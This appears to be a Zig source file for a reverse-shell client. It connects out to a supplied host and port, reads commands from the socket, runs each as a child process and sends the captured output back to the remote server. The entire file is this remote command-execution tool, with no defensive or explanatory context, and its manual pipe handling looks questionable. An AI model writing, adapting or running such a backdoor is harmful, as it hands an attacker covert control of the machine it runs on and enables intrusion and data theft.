const std = @import("std");

const MAX_INPUT_BYTES: usize = 1024;
const MAX_OUTPUT_BYTES: usize = 2048;

fn readCommand(socket: std.net.Stream) ![][]const u8 {
    const allocator = std.heap.page_allocator;
    var cmd = std.ArrayList([]const u8).init(allocator);
    defer cmd.deinit();

    var buf: [MAX_INPUT_BYTES]u8 = undefined;
    const buf_size = try socket.read(buf[0..]);
    if (buf_size == 0) return error.ServerClosed;

    const tmp = buf[0 .. buf_size - 1]; // Remove last character ('\n')
    var cmd_spl = std.mem.splitSequence(u8, tmp, " ");
    while (cmd_spl.next()) |c| {
        if (c.len > 0) {
            try cmd.append(try allocator.dupe(u8, c));
        }
    }

    return cmd.toOwnedSlice();
}

pub fn run(allocator: std.mem.Allocator, addr: []const u8, port: u16) !void {
    var socket = try std.net.tcpConnectToHost(allocator, addr, port);
    defer socket.close();

    const page_alloc = std.heap.page_allocator;
    var output_stdout = std.ArrayList(u8).init(page_alloc);
    defer output_stdout.deinit();
    var output_stderr = std.ArrayList(u8).init(page_alloc);
    defer output_stderr.deinit();

    while (true) {
        output_stdout.clearRetainingCapacity();
        output_stderr.clearRetainingCapacity();

        const cmd = readCommand(socket) catch |err| {
            switch (err) {
                error.ServerClosed => break,
                else => continue,
            }
        };

        // Execute the command.
        // Source: https://github.com/ziglang/zig/blob/master/lib/std/process/Child.zig#L208
        var p = std.process.Child.init(cmd, allocator);
        p.stdout_behavior = .Pipe;
        p.stderr_behavior = .Pipe;
        const fds = try std.posix.pipe2(.{ .CLOEXEC = true });
        p.stdout = std.fs.File{ .handle = fds[0] };
        p.stderr = std.fs.File{ .handle = fds[1] };
        try p.spawn();

        try p.collectOutput(&output_stdout, &output_stderr, MAX_OUTPUT_BYTES);

        _ = p.wait() catch |err| {
            const alloc = std.heap.page_allocator;
            const error_message = try std.fmt.allocPrint(alloc, "error: {}\n", .{err});
            _ = try socket.write(error_message);
            continue;
        };

        // Send the output to the server.
        if (output_stdout.items.len > 0) {
            _ = try socket.writeAll(output_stdout.items);
        } else if (output_stderr.items.len > 0) {
            _ = try socket.writeAll(output_stderr.items);
        } else {
            _ = try socket.writeAll("");
        }
    }
}
